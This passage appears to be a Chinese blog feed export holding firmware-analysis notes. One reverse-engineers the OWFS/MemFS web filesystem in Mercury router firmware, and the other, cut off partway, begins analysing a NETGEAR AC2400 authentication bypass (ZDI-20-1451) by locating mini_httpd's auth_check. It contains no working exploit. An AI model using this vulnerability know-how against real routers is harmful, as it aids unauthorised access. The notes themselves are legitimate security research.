<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</span></span><br><span class="line"><span class="comment"># /owow 搜索到字符串（？向上搜索</span></span><br><span class="line">00134b60  00 00 00 00 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |....owowowowowow|</span><br><span class="line">00134b70  6f 77 6f 77 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |owowowowowowowow|</span><br><span class="line">00134b80  6f 77 6f 77 00 00 00 01  00 00 00 a7 00 00 77 80  |owow..........w.|</span><br><span class="line">00134b90  63 6f 6d 6d 6f 6e 2e 6a  73 00 00 00 00 00 00 00  |common.js.......|</span><br><span class="line">00134ba0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134bb0  00 00 00 00 00 00 00 00  00 00 07 ee 00 00 1f 7c  |...............||</span><br><span class="line">00134bc0  63 73 73 5f 68 65 6c 70  2e 63 73 73 00 00 00 00  |css_help.css....|</span><br><span class="line">00134bd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134be0  00 00 00 00 00 00 00 00  00 00 01 e0 00 00 27 6c  |..............<span class="string">'l|</span></span><br><span class="line"><span class="string">00134bf0  63 73 73 5f 6d 61 69 6e  2e 63 73 73 00 00 00 00  |css_main.css....|</span></span><br><span class="line"><span class="string">00134c00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134c10  00 00 00 00 00 00 00 00  00 00 02 28 00 00 29 4c  |...........(..)L|</span></span><br><span class="line"><span class="string">00134c20  63 75 73 74 6f 6d 2e 6a  73 00 00 00 00 00 00 00  |custom.js.......|</span></span><br><span class="line"><span class="string">00134c30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134c40  00 00 00 00 00 00 00 00  00 00 00 fd 00 00 2b 74  |..............+t|</span></span><br><span class="line"><span class="string">00134c50  68 65 6c 70 2e 6a 73 00  00 00 00 00 00 00 00 00  |help.js.........|</span></span><br></pre></td></tr></table></figure>
<ul>
<li>有如下规律</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 并非web文件用00填充至48字节，因为那8个字节不全是00</span></span><br><span class="line">owow字符串（32字节</span><br><span class="line">12字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">8字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">8字节</span><br><span class="line">web文件（00填充至40字节</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="04-解析"><a href="#04-解析" class="headerlink" title="04-解析"></a>04-解析</h2><h3 id="1-压缩算法的Magic"><a href="#1-压缩算法的Magic" class="headerlink" title="1-压缩算法的Magic"></a>1-压缩算法的Magic</h3><ul>
<li>一直到这个规律的结尾</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00136a80  57 7a 64 57 61 6e 54 79  70 65 52 70 6d 2e 68 74  |WzdWanTypeRpm.ht|</span><br><span class="line">00136a90  6d 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |m...............|</span><br><span class="line">00136aa0  00 00 00 00 00 00 00 00  00 00 04 20 00 03 c5 28  |........... ...(|</span><br><span class="line">00136ab0  57 7a 64 57 6c 61 6e 52  70 6d 2e 68 74 6d 00 00  |WzdWlanRpm.htm..| <span class="comment"># 结尾的web文件</span></span><br><span class="line">00136ac0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00136ad0  00 00 00 00 00 00 00 00  00 00 12 e4 00 03 c9 48  |...............H| <span class="comment"># 此规律的结尾（40web文件 + 8</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.| # 紧接着5a 00 00 80</span></span><br></pre></td></tr></table></figure>
<ul>
<li>5D 00 00 80是LZMA压缩方式的魔术字节，位于压缩文件的开头。</li>
<li>而5a 00 00 80很类似，推测也是某种压缩算法的魔术字节，也位于每个压缩文件的开头，grep+wc看一下</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># grep后是行形式，wc -l统计多少行，故用来统计出现多少次</span></span><br><span class="line">$ hexdump -C mw150rv5-cn-up.bin | grep <span class="string">'5a 00 00 80'</span> | wc -l</span><br><span class="line">167</span><br></pre></td></tr></table></figure>
<ul>
<li>strings看web文件的出现次数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ strings mw150rv5-cn-up.bin | grep -e <span class="string">'\.js'</span> -e <span class="string">'\.htm'</span> -e <span class="string">'\.css'</span> -e <span class="string">'\.jpg'</span> -e <span class="string">'\.gif'</span> -e <span class="string">'\.html'</span>| wc -l</span><br><span class="line">167</span><br></pre></td></tr></table></figure>
<ul>
<li>5a 00 00 80与web文件出现的次数一致，可提出猜想：二者成对存在，魔术字节位于每个web文件的前面（不一定是紧挨着</li>
</ul>
<h3 id="2-header结构（32-12字节）"><a href="#2-header结构（32-12字节）" class="headerlink" title="2-header结构（32+12字节）"></a>2-header结构（32+12字节）</h3><ul>
<li>此binwalk命令已失效，只能手动看</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># o offset</span></span><br><span class="line"><span class="comment"># l length</span></span><br><span class="line"><span class="comment"># b block，现在为K</span></span><br><span class="line"><span class="comment"># C 现在为指定目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 000f5b90  6f 77 6f 77 00 00 00 01  00 00 00 8c 00 00 6f 30  |owow..........o0|</span></span><br><span class="line">embedded@ubuntu:~/Mercury/110523$ binwalk -C -o 0xf5b94 -l 12 -b 4 mw150rv5.bin </span><br><span class="line">DECIMAL   	HEX       	DESCRIPTION</span><br><span class="line">-------------------------------------------------------------------------------------------------------</span><br><span class="line">1006484   	0xF5B94   	Hex:                 0x00000001</span><br><span class="line">				Little Endian Long:  16777216</span><br><span class="line">				Big Endian Long:     1</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Mon Jul 13 21:20:16 1970</span><br><span class="line">				Big Endian Date:     Wed Dec 31 16:00:01 1969</span><br><span class="line">1006488   	0xF5B98   	Hex:                 0x0000008C</span><br><span class="line">				Little Endian Long:  -1946157056</span><br><span class="line">				Big Endian Long:     140</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Thu Apr 30 16:49:04 1908</span><br><span class="line">				Big Endian Date:     Wed Dec 31 16:02:20 1969</span><br><span class="line">1006492   	0xF5B9C   	Hex:                 0x00006F30</span><br><span class="line">				Little Endian Long:  812580864</span><br><span class="line">				Big Endian Long:     28464</span><br><span class="line">				Little Endian Short: 0</span><br><span class="line">				Big Endian Short:    0</span><br><span class="line">				Little Endian Date:  Sun Oct  1 13:54:24 1995</span><br><span class="line">				Big Endian Date:     Wed Dec 31 23:54:24 1969</span><br></pre></td></tr></table></figure>
<ul>
<li>owow后的12字节：00 00 00 01  00 00 00 a7 00 00 77 80，4字节为一组<ul>
<li>00 00 00 01：可能为版本（反正不是文件大小和偏移</li>
<li>00 00 00 a7 ：十进制167，正好与前面次数相对应</li>
<li>00 00 77 80：未知</li>
</ul>
</li>
<li>至此，分析出以下结构</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">struct owfs_header</span><br><span class="line">&#123;</span><br><span class="line">   char magic[32];           <span class="comment"># 'owowowowowow...'</span></span><br><span class="line">   uint32_t version;         <span class="comment"># version #1</span></span><br><span class="line">   uint32_t file_count;      <span class="comment"># 167</span></span><br><span class="line">   uint32_t unknown;         <span class="comment"># ？？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-fileEntry结构（40-8字节）"><a href="#3-fileEntry结构（40-8字节）" class="headerlink" title="3-fileEntry结构（40+8字节）"></a>3-fileEntry结构（40+8字节）</h3><ul>
<li>一般来讲，如果有文件名，那么还会有：文件在哪里、文件有多个</li>
<li>看第一个文件名common.js后的8字节：00 00 07 ee 和 00 00 1f 7c，推测二者是文件大小和在文件系统中的偏移</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">00134b60  00 00 00 00 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |....owowowowowow|</span><br><span class="line">00134b70  6f 77 6f 77 6f 77 6f 77  6f 77 6f 77 6f 77 6f 77  |owowowowowowowow|</span><br><span class="line">00134b80  6f 77 6f 77 00 00 00 01  00 00 00 a7 00 00 77 80  |owow..........w.|</span><br><span class="line">00134b90  63 6f 6d 6d 6f 6e 2e 6a  73 00 00 00 00 00 00 00  |common.js.......|</span><br><span class="line">00134ba0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00134bb0  00 00 00 00 00 00 00 00  00 00 07 ee 00 00 1f 7c  |...............||</span><br></pre></td></tr></table></figure>
<ul>
<li>假设第二个4字节00 00 1f 7c为偏移，基地址就取ow出现的地方00134b64（目前来看，其作为基址最合适</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 基址0x134b64 + 偏移0x1f7c = 物理地址0x136AE0（文件起始），正是第一个5a 00 00 80出现的地方</span></span><br><span class="line">00136ab0  57 7a 64 57 6c 61 6e 52  70 6d 2e 68 74 6d 00 00  |WzdWlanRpm.htm..| <span class="comment"># 结尾的web文件</span></span><br><span class="line">00136ac0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00136ad0  00 00 00 00 00 00 00 00  00 00 12 e4 00 03 c9 48  |...............H| <span class="comment"># 此规律的结尾（40web文件 + 8</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.| # 紧接着5a 00 00 80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 上述假设成立</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第二个4字节00 00 1f 7c为偏移，那么第一个4字节00 00 07 ee 为文件大小</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 起始地址0x136AE0 + 大小0x7ee = 结尾地址0x1372CE</span></span><br><span class="line">$ hexdump -s 0x1372ce -n 20 -C mw150rv5-cn-up.bin </span><br><span class="line">001372ce  00 00 5a 00 00 80 00 8d  08 00 00 00 00 00 00 00  |..Z.............|</span><br><span class="line">001372de  21 14 41 79                                       |!.Ay|</span><br><span class="line"><span class="comment"># 间隔了一个00后5a 00 00 80，这应该是第二个文件的魔术标记，验证确实如此</span></span><br><span class="line">$ hexdump -C mw150rv5-cn-up.bin | grep <span class="string">'5a 00 00 80'</span></span><br><span class="line">00136ae0  5a 00 00 80 00 26 22 00  00 00 00 00 00 00 33 1e  |Z....&amp;<span class="string">".......3.|</span></span><br><span class="line"><span class="string">001372d0  5a 00 00 80 00 8d 08 00  00 00 00 00 00 00 21 14  |Z.............!.|</span></span><br><span class="line"><span class="string">001374b0  5a 00 00 80 00 67 09 00  00 00 00 00 00 00 21 14  |Z....g........!.|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 为何间隔了一个00后才是标记呢？为了某种对齐？（填充00至4的倍数</span></span><br><span class="line"><span class="string">0x1372CE + 1 = 0x1372CF = 1274575（不是4的倍数</span></span><br><span class="line"><span class="string">0x1372CE + 2 = 0x1372D0 = 1274576（是4的倍数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 第二个web文件</span></span><br><span class="line"><span class="string">00134bc0  63 73 73 5f 68 65 6c 70  2e 63 73 73 00 00 00 00  |css_help.css....|</span></span><br><span class="line"><span class="string">00134bd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span></span><br><span class="line"><span class="string">00134be0  00 00 00 00 00 00 00 00  00 00 01 e0 00 00 27 6c  |..............'l|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 大小：00 00 01 e0</span></span><br><span class="line"><span class="string"># 偏移：00 00 27 6c</span></span><br><span class="line"><span class="string"># 开始地址：0x134b64 + 0x276c = 0x1372D0 + 0x1e0 = </span></span><br><span class="line"><span class="string"># 结束地址：0x1372D0 + 0x1e0 = 0x1374B0 = 1275056（是4的倍数，所以无需加00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>综上，每个条目的结构体</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">struct owfs_entry</span><br><span class="line">&#123;</span><br><span class="line">   char file_name[40];<span class="comment"># 需用00填充至40</span></span><br><span class="line">   uint32_t file_size;<span class="comment"># 文件的真正大小</span></span><br><span class="line">   uint32_t file_offset;<span class="comment"># 在文件系统中的偏移，文件系统基地址为owow出现的地方（binwalk结果也可验证</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="05-获取web文件"><a href="#05-获取web文件" class="headerlink" title="05-获取web文件"></a>05-获取web文件</h2><h3 id="1-提取文件系统（from-固件"><a href="#1-提取文件系统（from-固件" class="headerlink" title="1-提取文件系统（from 固件"></a>1-提取文件系统（from 固件</h3><ul>
<li>注意：文件系统是在固件文件中的，可用dd提取出来</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已知要提取多少数据</span></span><br><span class="line"><span class="comment"># count是针对bs的</span></span><br><span class="line">dd <span class="keyword">if</span>=US_AC15V1.0BR_V15.03.1.16_multi_TD01.bin bs=1 count=8549574 skip=1674524 of=image</span><br><span class="line">		<span class="comment"># if 参数设置输入的文件，</span></span><br><span class="line">		<span class="comment"># bs 是输入输出块的大小，</span></span><br><span class="line">		<span class="comment"># count 是输入输出块的个数(抽取的总字节数可以理解为 bs * count)，</span></span><br><span class="line">		<span class="comment"># skip 是从文件头开始的偏移量，</span></span><br><span class="line">		<span class="comment"># of 指定输出字节的保存位置，这些数据在 binwalk 中都能找到。</span></span><br><span class="line">		</span><br><span class="line"><span class="comment"># 不知道要提取多少，只知道从一个偏移到最后（1264484是文件系统的开始地方，即字符串owow开始</span></span><br><span class="line"><span class="comment"># 可见skip也是针对bs的</span></span><br><span class="line">dd bs=1264484 skip=1 <span class="keyword">if</span>=mw150rv5-cn-up.bin of=filesystem.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不可跟16进制</span></span><br></pre></td></tr></table></figure>
<h3 id="2-提取web文件（from-文件系统"><a href="#2-提取web文件（from-文件系统" class="headerlink" title="2-提取web文件（from 文件系统"></a>2-提取web文件（from 文件系统</h3><ul>
<li>提取出web文件：<a href="http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c" target="_blank" rel="noopener">http://www.devttys0.com/wp-content/uploads/2011/06/unowfs.c</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ dd bs=1264484 skip=1 <span class="keyword">if</span>=mw150rv5-cn-up.bin of=filesystem.bin</span><br><span class="line">$ gcc -Wall unowfs.c -o unowfs</span><br><span class="line">$ ./unowfs filesystem.bin </span><br><span class="line">Extracting 167 files from OWFS version 1 image...</span><br><span class="line"></span><br><span class="line">common.js [2030]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Extracted 167 files to ./owfs-root/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取后，文件内容不可读，应该还是压缩后的状态</span></span><br><span class="line">$ cat owfs-root/menu.js </span><br><span class="line"><span class="comment"># 还是有5a 00 00 80压缩的标记</span></span><br><span class="line">$ hexdump owfs-root/menu.js -C</span><br><span class="line">00000000  5a 00 00 80 00 8a 1f 00  00 00 00 00 00 00 3b 18  |Z.............;.|</span><br><span class="line">00000010  89 c2 e7 c3 a6 4f 05 bb  af 2c af a9 e6 08 f6 f8  |.....O...,......|</span><br></pre></td></tr></table></figure>
<h3 id="3-解压缩"><a href="#3-解压缩" class="headerlink" title="3-解压缩"></a>3-解压缩</h3><ul>
<li>解压缩</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win下的7zip可识别出压缩算法，可直接解开</span></span><br><span class="line">类型: lzma</span><br><span class="line">算法: LZMA:23:lc0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu下，自带p7zip，-d参数可解，但其只认.7z后缀的（手动修改以测试</span></span><br><span class="line">$ p7zip -d menu.js.7z </span><br><span class="line">Path = menu.js.7z</span><br><span class="line">Open WARNING: Can not open the file as [7z] archive</span><br><span class="line">Type = lzma<span class="comment"># 识别出lzma类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 既然是lzma压缩的，lzma也可直接解压缩，同样只认后缀为.lzma</span></span><br><span class="line">lzma -d menu.js.lzma </span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行脚本批量解压</span></span><br><span class="line"><span class="keyword">for</span> FILE <span class="keyword">in</span> *; <span class="keyword">do</span> mv <span class="variable">$FILE</span> <span class="variable">$FILE</span>.7z &amp;&amp; p7zip -d <span class="variable">$FILE</span>.7z; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h2 id="06-只有web文件？"><a href="#06-只有web文件？" class="headerlink" title="06-只有web文件？"></a>06-只有web文件？</h2><blockquote>
<p>为何文件系统中只有web文件，其他的如httpd程序呢（过程：固件文件中提取出文件系统、提取出web文件、解压缩web文件</p>
<p><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">	This file system is part of the WindRiver’s Web Server architecture <span class="keyword">for</span> embedded devices, so you will likely find it inside firmwares based on VxWorks. It is known as MemFS (watch out, not the common MemFS) or Wind River management file system, and basically allows devices to serve files via the embedded web server without needing an ‘actual’ file system since this one lies on its non-volatile memory.</span><br><span class="line">	VxWorks  provides  pagepack, a tool used to transform any file intended to be served by a WindWeb server into C code. Therefore, a developer just compiles everything into the same firmware image.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个文件系统是WindRiver嵌入式设备Web服务器架构的一部分，因此可在基于VxWorks的固件中找到。</span></span><br><span class="line"><span class="comment"># 它被称为MemFS（并非普通的MemFS）或Wind-River文件系统。</span></span><br><span class="line"><span class="comment"># 设备可通过嵌入的web服务器提供文件，而不需要“实际”的文件系统，因为这个文件系统位于非易失性内存中。</span></span><br><span class="line"><span class="comment"># VxWorks提供pagepack工具（可将WindWeb服务器提供的任何文件转换为C代码），因此，开发者需要将所有东西编译到同一个固件镜像中。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># web文件经过pagepack转为为C代码，再与web服务器的C代码，一同编译成固件，如图</span></span><br></pre></td></tr></table></figure>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072230.jpg" alt="image-20210106125432708"></p>
<ul>
<li>如何看来，固件中应该也有web服务器，怎么提取出来？//here</li>
</ul>
<h2 id="07-小结"><a href="#07-小结" class="headerlink" title="07-小结"></a>07-小结</h2><blockquote>
<p><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></p>
</blockquote>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072232.jpg" alt="image-20210106143348400"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">- The header is not necessarily 12 but 8 so the third field seems optional.</span><br><span class="line"><span class="comment"># header字段可能为12 或 8，后4字节可选</span></span><br><span class="line"><span class="comment"># （前面遇到的就是12字节</span></span><br><span class="line">- The first 4 bytes look like a flag field that may indicate, among other things,  whether  a file data will be compressed or not (1 = Compressed, 2 = Plain)</span><br><span class="line"><span class="comment"># header字段中，前4表示是否被压缩，因此：4-是否被压缩、4-文件个数、4-可选</span></span><br><span class="line"><span class="comment"># （前面的为1，就是被压缩的</span></span><br><span class="line">- The signature can vary between firmwares since it is defined by the constant ‘HTTP_UNIQUE_SIGNATURE’ , <span class="keyword">in</span> fact, we may find this signature twice inside a firmware; the first one due to  the .h  <span class="built_in">where</span> it is defined (close to other strings such as the webserver banner )and the second one already as part of  the MemFS.</span><br><span class="line"><span class="comment"># owow签名字符串可能不同（其他固件中并非也是owow），其是由常量 HTTP_UNIQUE_SIGNATURE 定义的</span></span><br><span class="line"><span class="comment"># 可能在固件中发现两次，第一次是在h头文件中（挨着web服务器banner信息），第二次就是文件系统中</span></span><br><span class="line"><span class="comment"># （前面的就出现了一次，即在文件系统的开头</span></span><br></pre></td></tr></table></figure>
<h3 id="1-总结构"><a href="#1-总结构" class="headerlink" title="1-总结构"></a>1-总结构</h3><p>综上，自己概括出结构</p>
<ul>
<li>签名<ul>
<li>32字节</li>
<li>可能不仅owow一种情况</li>
<li>可能在固件中出现两次（h头文件中、文件系统中</li>
</ul>
</li>
<li>header头<ul>
<li>共12字节（或8</li>
<li>4：是否压缩的标记</li>
<li>4：文件个数</li>
<li>4：可选</li>
</ul>
</li>
<li>文件项（数组）<ul>
<li>共48字节</li>
<li>40：文件名（00填充至40</li>
<li>4：文件大小</li>
<li>4：文件偏移（文件系统基地址为owow出现的地方</li>
</ul>
</li>
<li>文件数据（数组）<ul>
<li>两种情况：compressed 或 plain</li>
<li>若是压缩的，则4字节Magic + compressed data</li>
<li>文件大小会00填充，至4的倍数</li>
</ul>
</li>
</ul>
<h3 id="2-举例"><a href="#2-举例" class="headerlink" title="2-举例"></a>2-举例</h3><ul>
<li><p><a href="http://www.devttys0.com/2011/06/mystery-file-system/（header字段12字节" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/（header字段12字节</a></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-72235.jpg" alt="image-20210106151039295"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072233.jpg" alt="image-20210106151823065"></p>
</li>
<li><p><a href="https://ioactive.com/solving-a-little-mystery/（header字段7字节，并且file" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/（header字段7字节，并且file</a> entry也不同</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2021-01-06-072234.jpg" alt="image-20210106151805203"></p>
</li>
</ul>
<h2 id="08-其他"><a href="#08-其他" class="headerlink" title="08-其他"></a>08-其他</h2><ul>
<li>固件中能够提取出web服务器？</li>
</ul>
<blockquote>
<p>参考</p>
<ul>
<li><a href="http://www.devttys0.com/2011/06/mystery-file-system/" target="_blank" rel="noopener">http://www.devttys0.com/2011/06/mystery-file-system/</a></li>
<li><a href="https://ioactive.com/solving-a-little-mystery/" target="_blank" rel="noopener">https://ioactive.com/solving-a-little-mystery/</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>IOT安全</category>
      </categories>
      <tags>
        <tag>IOT安全</tag>
        <tag>固件分析</tag>
      </tags>
  </entry>
  <entry>
    <title>NetGear-AC2400认证绕过漏洞分析</title>
    <url>/2021/07/24/iot/NetGear-AC2400%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="NetGear-AC2400认证绕过漏洞分析"><a href="#NetGear-AC2400认证绕过漏洞分析" class="headerlink" title="NetGear-AC2400认证绕过漏洞分析"></a>NetGear-AC2400认证绕过漏洞分析</h1><h2 id="00-pre"><a href="#00-pre" class="headerlink" title="00-pre"></a>00-pre</h2><ul>
<li>固件下载：<a href="https://www.netgear.com/support/product/AC2400.aspx，1.2.0.74" target="_blank" rel="noopener">https://www.netgear.com/support/product/AC2400.aspx，1.2.0.74</a> 和 1.2.0.76 两个版本固件</li>
<li>漏洞通告：<a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1451/" target="_blank" rel="noopener">https://www.zerodayinitiative.com/advisories/ZDI-20-1451/</a></li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the mini_httpd service, <span class="built_in">which</span> listens on TCP port 80 by default. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this <span class="keyword">in</span> conjunction with other vulnerabilities to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="01-定位"><a href="#01-定位" class="headerlink" title="01-定位"></a>01-定位</h2><ul>
<li>Shift+F12 搜索字符串，漏洞位于处理用户请求的位置，所以直接搜索 Content-Length 或者其他请求头中会出现的字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 incorrect string matching logic when accessing protected pages，可见是处理用户请求，其实一般都是</span></span><br><span class="line"><span class="comment"># 2 Content-Length、Content-Type、Host等常见的http请求头来定位</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过交叉引用可以定位到函数 0x40A540 (1.2.0.74)，其中存在以下代码片段</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 好像是一个报错的信息，哪个文件的哪个函数的哪一行</span></span><br><span class="line"><span class="comment"># 通过此，可判定函数名，handle_request</span></span><br><span class="line">v4 = (FILE *)fopen64(<span class="string">"/dev/console"</span>, <span class="string">"a+"</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  fprintf(v4, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"handle_request"</span>, 1634);</span><br><span class="line">  fputs(<span class="string">"read\n"</span>, v4);</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>handle_request，用于处理http请求（通过名字），只有main中一处调用</li>
</ul>
<h2 id="02-修复点"><a href="#02-修复点" class="headerlink" title="02-修复点"></a>02-修复点</h2><ul>
<li>ida 68 + bindiff 43，找到修改项</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确实找到0x40A540 vs 0040B5CC这一项，相似度0.65</span></span><br><span class="line"><span class="comment"># 不是一上来就bindiff看，往往有很多，不好定位，要换个思路：先找到相关函数，再bindiff验证是否不同，再细看</span></span><br><span class="line"><span class="comment"># 文中说ida75 + bindiff 6可，但之前测过好像不行</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如何修复的？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原话：比较两份代码，主要逻辑变化不大，但是新版中添加了 SSO 相关逻辑，即单点登录，猜测官方通过引入单点登录的手段对漏洞进行修复。（怎么看出主要逻辑变化不大的？硬看？</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ida75 反编译my_handle_requests函数，76中出现了大量“sso”字符串（36次），而74中一个都没有</span></span><br><span class="line"><span class="comment"># sso，单点登录（Single Sign On），用户只需要登录一次就可以访问所有相互信任的应用系统</span></span><br><span class="line"><span class="comment"># 猜测官方通过引入单点登录的手段对来对漏洞进行修复，待验证//here</span></span><br></pre></td></tr></table></figure>
<h2 id="03-关键函数"><a href="#03-关键函数" class="headerlink" title="03-关键函数"></a>03-关键函数</h2><h3 id="1-auth-check"><a href="#1-auth-check" class="headerlink" title="1-auth_check"></a>1-auth_check</h3><ul>
<li>找处理login请求的函数</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 auth、check等字符串</span></span><br><span class="line"><span class="comment"># 2 如上mini_httpd.c特定代码段的方式，看还有哪些函数</span></span><br><span class="line">fprintf(v30, <span class="string">"[%s::%s():%d] "</span>, <span class="string">"mini_httpd.c"</span>, <span class="string">"auth_check"</span>, 3682);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 找到在.text:00407FC0处，重命名为my_auth_check</span></span><br><span class="line"><span class="comment"># 2 被my_handle_request调用</span></span><br></pre></td></tr></table></figure>
<ul>
<li>判断is_setup_wizard标记（自命名的</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  检查某标记，不为1则正常登录</span></span><br><span class="line"><span class="comment">#  为1则跳过，进一步检查是否是lan用户，如果不是则丢弃</span></span><br><span class="line">char *__fastcall my_auth_check(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( is_setup_wizard != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">  	<span class="comment"># 正常的登录逻辑</span></span><br><span class="line">  &#125;</span><br><span class="line">  v2 = check_lan_guest();</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment"># 如果from wan，则丢弃请求</span></span><br><span class="line">    v4 = <span class="string">"/bin/echo genie from wan, drop request &gt; /dev/console"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-handle-request"><a href="#2-handle-request" class="headerlink" title="2-handle_request"></a>2-handle_request</h3><ul>
<li>何处赋值is_setup_wizard标记</li>
</ul>
